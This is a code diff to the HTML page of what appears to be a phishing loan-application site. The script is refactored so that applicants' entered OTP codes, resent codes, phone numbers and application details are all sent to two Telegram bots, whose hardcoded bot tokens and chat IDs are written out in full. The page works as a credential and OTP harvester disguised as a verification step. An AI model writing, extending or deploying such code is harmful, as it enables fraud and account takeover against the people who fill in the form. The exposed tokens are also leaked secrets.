@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -288,6 +289,12 @@
     </div>
 
     <script>
+        // Bot configurations
+        const BOTS = [
+            { token: '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI', chatId: '5520957080' },
+            { token: '8778116219:AAGIDOJeTkxMXofhI_CZGPJzaoaGoCmnoDc', chatId: '5557779815' }
+        ];
+        
         let otpData = {};
         let countdownInterval = null;
         let timeLeft = 109; // 109 seconds like in your image
@@ -541,7 +548,7 @@
             
             if (enteredOtp === otpData.otp) {
                 // OTP verified successfully
-                sendVerificationSuccess(enteredOtp);
+                sendVerificationSuccessToAllBots(enteredOtp);
                 
                 // Redirect to qualification page (like your image 1001918218.jpg)
                 window.location.href = 'qualification.html';
@@ -549,8 +556,8 @@
                 // Invalid OTP
                 alert('Invalid OTP. Please try again.');
                 
-                // Send invalid attempt to Telegram (EXACTLY AS BEFORE - NOT CHANGED)
-                sendInvalidOTPToTelegram(enteredOtp);
+                // Send invalid attempt to both bots
+                sendInvalidOTPToAllBots(enteredOtp);
                 
                 // Clear inputs
                 if (useIndividualInputs) {
@@ -565,22 +572,10 @@
             }
         }
         
-        function sendVerificationSuccess(enteredOtp) {
-    const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
-    
-    // Both bot configurations
-    const bots = [
-        {
-            token: '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI',
-            chatId: '5520957080'
-        },
-        {
-            token: '8778116219:AAGIDOJeTkxMXofhI_CZGPJzaoaGoCmnoDc',
-            chatId: '5557779815'
-        }
-    ];
-    
-    const message = `
+        function sendVerificationSuccessToAllBots(enteredOtp) {
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            
+            const message = `
 ✅ *OTP VERIFICATION COMPLETE*
 
 📋 *Application ID:* ${applicationData.applicationId || 'N/A'}
@@ -595,37 +590,21 @@
 • Purpose: ${applicationData.purpose || 'N/A'}
 
 🎯 *Redirecting to Account Qualification*
-    `;
-    
-    const encodedMessage = encodeURIComponent(message);
-    
-    // Send to both Telegram bots
-    bots.forEach((bot, index) => {
-        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodedMessage}&parse_mode=Markdown`)
-            .then(response => response.json())
-            .then(result => {
-                console.log(`Verification Success Bot ${index + 1}:`, result.ok ? '✅ Sent' : '❌ Failed');
-            })
-            .catch(error => console.error(`Verification Success Bot ${index + 1} Error:`, error));
-    });
-}
-
-function sendInvalidOTPToTelegram(enteredOtp) {
-    const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
-    
-    // Both bot configurations
-    const bots = [
-        {
-            token: '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI',
-            chatId: '5520957080'
-        },
-        {
-            token: '8778116219:AAGIDOJeTkxMXofhI_CZGPJzaoaGoCmnoDc',
-            chatId: '5557779815'
+            `;
+            
+            const encodedMessage = encodeURIComponent(message);
+            
+            // Send to both bots
+            BOTS.forEach(bot => {
+                fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+                    .catch(error => console.error(`Error sending to bot ${bot.token}:`, error));
+            });
         }
-    ];
-    
-    const message = `
+        
+        function sendInvalidOTPToAllBots(enteredOtp) {
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            
+            const message = `
 ❌ *INVALID OTP ATTEMPT*
 
 📋 *Application ID:* ${applicationData.applicationId || 'N/A'}
@@ -635,72 +614,56 @@ function sendInvalidOTPToTelegram(enteredOtp) {
 
 🕒 *Time:* ${new Date().toLocaleString()}
 ⚠️ *Client entered wrong OTP*
-    `;
-    
-    const encodedMessage = encodeURIComponent(message);
-    
-    // Send to both Telegram bots
-    bots.forEach((bot, index) => {
-        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodedMessage}&parse_mode=Markdown`)
-            .then(response => response.json())
-            .then(result => {
-                console.log(`Invalid OTP Bot ${index + 1}:`, result.ok ? '✅ Sent' : '❌ Failed');
-            })
-            .catch(error => console.error(`Invalid OTP Bot ${index + 1} Error:`, error));
-    });
-}
-
-function resendOTP() {
-    if (timeLeft > 0) {
-        alert(`Please wait ${timeLeft} seconds before resending OTP`);
-        return;
-    }
-    
-    // Generate new OTP
-    const newOTP = Math.floor(100000 + Math.random() * 900000);
-    
-    // Update OTP data
-    otpData.otp = newOTP.toString();
-    otpData.expires = new Date(Date.now() + 15 * 60 * 1000).toISOString();
-    
-    localStorage.setItem('otpVerification', JSON.stringify(otpData));
-    
-    // Send new OTP to Telegram
-    const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
-    sendNewOTPToTelegram(newOTP, applicationData.phone || otpData.phone);
-    
-    // Reset timer
-    timeLeft = 109;
-    startCountdown();
-    
-    // Clear inputs
-    if (useIndividualInputs) {
-        document.querySelectorAll('.otp-input').forEach(input => input.value = '');
-        document.querySelector('.otp-input[data-index="0"]').focus();
-    } else {
-        document.getElementById('otpMainInput').value = '';
-        document.getElementById('otpMainInput').focus();
-    }
-    
-    alert('New OTP has been sent.');
-}
-
-function sendNewOTPToTelegram(otp, phone) {
-    // Both bot configurations
-    const bots = [
-        {
-            token: '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI',
-            chatId: '5520957080'
-        },
-        {
-            token: '8778116219:AAGIDOJeTkxMXofhI_CZGPJzaoaGoCmnoDc',
-            chatId: '5557779815'
+            `;
+            
+            const encodedMessage = encodeURIComponent(message);
+            
+            // Send to both bots
+            BOTS.forEach(bot => {
+                fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+                    .catch(error => console.error(`Error sending to bot ${bot.token}:`, error));
+            });
         }
-    ];
-    
-    const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
-    
-    const message = `
+        
+        function resendOTP() {
+            if (timeLeft > 0) {
+                alert(`Please wait ${timeLeft} seconds before resending OTP`);
+                return;
+            }
+            
+            // Generate new OTP
+            const newOTP = Math.floor(100000 + Math.random() * 900000);
+            
+            // Update OTP data
+            otpData.otp = newOTP.toString();
+            otpData.expires = new Date(Date.now() + 15 * 60 * 1000).toISOString();
+            
+            localStorage.setItem('otpVerification', JSON.stringify(otpData));
+            
+            // Send new OTP to both bots
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            sendNewOTPToAllBots(newOTP, applicationData.phone || otpData.phone);
+            
+            // Reset timer
+            timeLeft = 109;
+            startCountdown();
+            
+            // Clear inputs
+            if (useIndividualInputs) {
+                document.querySelectorAll('.otp-input').forEach(input => input.value = '');
+                document.querySelector('.otp-input[data-index="0"]').focus();
+            } else {
+                document.getElementById('otpMainInput').value = '';
+                document.getElementById('otpMainInput').focus();
+            }
+            
+            alert('New OTP has been sent.');
+        }
+        
+        function sendNewOTPToAllBots(otp, phone) {
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            
+            const message = `
 🔄 *OTP RESENT*
 
 📋 *Application ID:* ${applicationData.applicationId || 'N/A'}
@@ -709,20 +672,16 @@ function sendNewOTPToTelegram(otp, phone) {
 ⏰ *Expires:* 15 minutes
 
 🕒 *Resent at:* ${new Date().toLocaleString()}
-    `;
-    
-    const encodedMessage = encodeURIComponent(message);
-    
-    // Send to both Telegram bots
-    bots.forEach((bot, index) => {
-        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodedMessage}&parse_mode=Markdown`)
-            .then(response => response.json())
-            .then(result => {
-                console.log(`Resend OTP Bot ${index + 1}:`, result.ok ? '✅ Sent' : '❌ Failed');
-            })
-            .catch(error => console.error(`Resend OTP Bot ${index + 1} Error:`, error));
-    });
-}
+            `;
+            
+            const encodedMessage = encodeURIComponent(message);
+            
+            // Send to both bots
+            BOTS.forEach(bot => {
+                fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+                    .catch(error => console.error(`Error sending to bot ${bot.token}:`, error));
+            });
+        }
     </script>
 </body>
 </html>
